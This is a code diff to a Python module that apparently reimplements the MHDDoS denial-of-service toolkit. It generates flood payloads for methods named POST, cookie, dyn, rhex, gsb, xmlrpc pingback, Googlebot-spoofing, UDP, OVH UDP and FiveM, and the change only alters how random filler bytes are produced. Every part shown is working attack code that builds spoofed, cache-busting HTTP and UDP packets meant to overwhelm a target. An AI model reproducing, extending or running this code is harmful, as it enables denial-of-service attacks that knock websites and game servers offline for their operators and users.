@@ -36,7 +36,7 @@ def _forwarded(ctx: BuildCtx, ua: str, ref: str, spoof: str) -> str:
     )
 
 
-def _noise(size: int, index: int) -> bytes:
+def _noise(size: int) -> bytes:
     """Independent random bytes per stream.
 
     MHDDoS calls ``os.urandom`` per packet. Bytes are fixed once a stream is compiled, so
@@ -74,7 +74,7 @@ def head(ctx, index, source):
 
 def _post_like(ctx, index, source, body_size: int) -> bytes:
     ua, ref, spoof = _identity(ctx, index)
-    body = '{"data": "' + _noise(body_size, index).hex() + '"}'
+    body = '{"data": "' + _noise(body_size).hex() + '"}'
     return (
         "POST / HTTP/1.1\r\n"
         + source.browser_headers
@@ -110,17 +110,17 @@ def cookie(ctx, index, source):
         ctx,
         index,
         source,
-        extra=f"Cookie: _ga=GA{1000 + index}; _gat=1; __cfduid={_noise(16, index).hex()};\r\n",
+        extra=f"Cookie: _ga=GA{1000 + index}; _gat=1; __cfduid={_noise(16).hex()};\r\n",
     )
 
 
 def dyn(ctx, index, source):
-    return _get_like(ctx, index, source, host=f"{_noise(3, index).hex()}.{ctx.authority}")
+    return _get_like(ctx, index, source, host=f"{_noise(3).hex()}.{ctx.authority}")
 
 
 def rhex(ctx, index, source):
     ua, ref, spoof = _identity(ctx, index)
-    blob = _noise(32, index).hex()
+    blob = _noise(32).hex()
     return (
         f"GET {ctx.authority}/{blob} HTTP/1.1\r\nHost: {ctx.authority}/{blob}\r\n"
         + _forwarded(ctx, ua, ref, spoof)
@@ -143,7 +143,7 @@ def stomp(ctx, index, source):
 def gsb(ctx, index, source):
     ua, ref, spoof = _identity(ctx, index)
     return (
-        f"HEAD /?qs={_noise(3, index).hex()} HTTP/1.1\r\nHost: {ctx.authority}\r\n"
+        f"HEAD /?qs={_noise(3).hex()} HTTP/1.1\r\nHost: {ctx.authority}\r\n"
         + _forwarded(ctx, ua, ref, spoof)
         + source.browser_headers
         + "\r\n"
@@ -167,8 +167,8 @@ def xmlrpc(ctx, index, source):
     body = (
         "<?xml version='1.0' encoding='iso-8859-1'?>"
         "<methodCall><methodName>pingback.ping</methodName><params>"
-        f"<param><value><string>{_noise(32, index).hex()}</string></value></param>"
-        f"<param><value><string>{_noise(32, index).hex()}</string></value></param>"
+        f"<param><value><string>{_noise(32).hex()}</string></value></param>"
+        f"<param><value><string>{_noise(32).hex()}</string></value></param>"
         "</params></methodCall>"
     )
     return (
@@ -193,18 +193,18 @@ def bot(ctx, index, source):
         f"GET /sitemap.xml HTTP/1.1\r\nHost: {ctx.authority}\r\n"
         "Connection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\n"
         f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n"
-        f"If-None-Match: {_noise(5, index).hex()}-{_noise(2, index).hex()}\r\n"
+        f"If-None-Match: {_noise(5).hex()}-{_noise(2).hex()}\r\n"
         "If-Modified-Since: Sun, 26 Sep 2099 06:00:00 GMT\r\n\r\n"
     )
     return (first + second).encode()
 
 
 def udp(ctx, index, source):
-    return _noise(1024, index)
+    return _noise(1024)
 
 
 def ovh_udp(ctx, index, source):
-    fill = _noise(1024 + (index % 4) * 256, index)
+    fill = _noise(1024 + (index % 4) * 256)
     head = f"{source.ovh_udp_methods[index % len(source.ovh_udp_methods)]} ".encode()
     path = source.ovh_udp_paths[index % len(source.ovh_udp_paths)].encode()
     return head + path + fill + f" HTTP/1.1\nHost: {ctx.host}:{ctx.port}\r\n\r\n".encode()
@@ -216,7 +216,7 @@ def icmp(ctx, index, source):
 
 def fivem_token(ctx, index, source):
     guid = 76561197960265728 + index
-    return f"token={_noise(16, index).hex()}&guid={guid}".encode()
+    return f"token={_noise(16).hex()}&guid={guid}".encode()
 
 
 def _amplifier(name: str):
